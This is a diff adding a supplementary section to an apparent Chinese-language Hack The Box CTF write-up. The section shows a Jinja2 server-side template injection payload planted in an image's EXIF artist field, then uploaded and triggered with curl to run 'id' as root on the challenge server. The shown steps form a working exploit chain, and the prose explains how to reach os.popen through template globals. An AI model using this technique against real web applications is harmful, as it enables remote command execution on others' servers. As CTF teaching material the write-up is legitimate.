@@ -303,4 +303,36 @@ Verified! HTB{mu...5f}
 ### POC
 [exploit.py](exploit.py)
 
+
+### 補充
+
+```bash
+──(kali㉿kali)-[~/ctf/guild]
+└─$ exiftool -overwrite_original -artist="{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}" image4.jpg
+ 
+    1 image files updated
+                                                                            
+┌──(kali㉿kali)-[~/ctf/guild]
+└─$  curl -k -X POST http://94.237.52.164:34798/verification -b 'remember_token=2|a66ef54621bdf91b88a8a19678ec9b7198e59918428f61f7a46194561d8ecf13432a87a6a769c16f209b9268e9acb7fa03e049201ac199896d5023b70b22aac0; session=.eJwlzjkOwkAMQNG7uKaY3Z5cJvIqaCekQtydkejfl_4Hzlh-PeF4r9sfcL4MDkhW1c0Qk2ZxFyUWz9IjsRrpxMZeLG_GKbzlLGipoDXtfTOl4WK9JJmRMQ0cY8w6yk49eEYxJYraJxM3rVobcefBpQeGtGqwR-7L1_-mwPcHgw4xDg.aQluzw.dDw_j7ZJpA4DbHY5Lp0L78eFq_s'  -F 'file=@image4.jpg'
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.
+
+┌──(kali㉿kali)-[~/ctf/guild]
+└─$ curl -k -X POST http://94.237.52.164:34798/verify \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -b 'remember_token=1|d79f88a42583ac76fc585990ddd4f27f7632bf313e44b783b927a0afc5de9e4b48323bdb4fd3965366e5af8a15980291581bdfe448cce8b9fb30d34f839e6899; session=.eJwlzjkOwkAMQNG7uKaY3Z5cJvIqaCekQtydkejfl_4Hzlh-PeF4r9sfcL4MDkhW1c0Qk2ZxFyUWz9IjsRrpxMZeLG_GKbzlLGipoDXtfTOl4WK9JJmRMQ0cY8w6yk49eEYxJYraJxM3rVobcefBpQeGtGqwR-7L1_8mw_cHgwsxDQ.aQl3Bg.u4iuVfcBJgRVuiFMwPYuVE-sMIc' \
+  --data 'user_id=2&verification_id=5'
+Verified! uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+```
+
+了解原理後
+找到 joiner 等其他 function 也都能成功
+只要在 self._TemplateReference__context 透過 [test.py](test.py) env 能夠接到 `__globals__` 的方法都可以
+因為後續就可以靠 `os.popen("cmd").read()` 取得 cmd
+![alt text](image-5.png)
+
 **Note**: 此 writeup 僅用於教育目的,請勿在未經授權的系統上進行測試。
